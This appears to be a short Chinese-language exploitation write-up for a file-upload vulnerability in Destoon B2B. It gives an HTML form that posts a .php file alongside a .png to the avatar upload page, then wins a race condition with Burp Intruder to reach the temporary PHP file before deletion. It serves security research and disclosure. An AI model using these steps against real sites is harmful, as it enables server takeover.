# Destoon b2b上传漏洞

## 普通会员上传漏洞
首先登录*[提示信息_DESTOON B2B网站管理系统](http://127.0.0.1/member/register.php?action=verify&sid=79d28392e07bfcff22488ff69ab25a51)*注册一个普通用户

漏洞页面上传[会员登录_DESTOON B2B网站管理系统](http://127.0.0.1/member/avatar.php)

为了多个验证，需要上传POST两个文件

```html
<form action="http://127.0.0.1/member/avatar.php?" method="post" enctype="multipart/form-data">
        请选择我的上传文件
	<input type="hidden" name="action" value="upload"/>
        <input type="file" name="file"/>
        <input type="file" name="file1"/>
        <input type="submit" value="上传" />
</form>
```

![](README/966F9481-0216-4252-B6B8-85E98FC29F03.png)

上传的包第一个是文件名后缀改成php
![](README/CDC56566-CB42-44FF-9D13-5B059F05A902.png)

第二个包后缀改成png
![](README/42A80BB2-FCD1-4B9E-A8AA-287459EEDD1F.png)




![](README/0E25C1BB-974B-4D05-81BE-9100BEE5988C.png)

由于文件会被删掉，所以需要进行竞争条件测试

路径 是在file_temp_avatar2.php 2是用户的ID

![](README/AC037676-E8DF-4563-B431-56D67153DB6B.png)

![](README/22D1BC9A-5585-4384-AB92-881309145122.png)

然后利用burp的intruder模块进行竞争条件测试
![](README/7567C0A6-CA28-45CB-984F-647BC01DA3E5.png)


![](README/B38DEA3E-E6FC-4B88-83E5-3CE988DA7F3C.png)







https://xz.aliyun.com/t/2797
https://www.scanv.com/news/5bacbdfd38a66c0cf45a4657.html
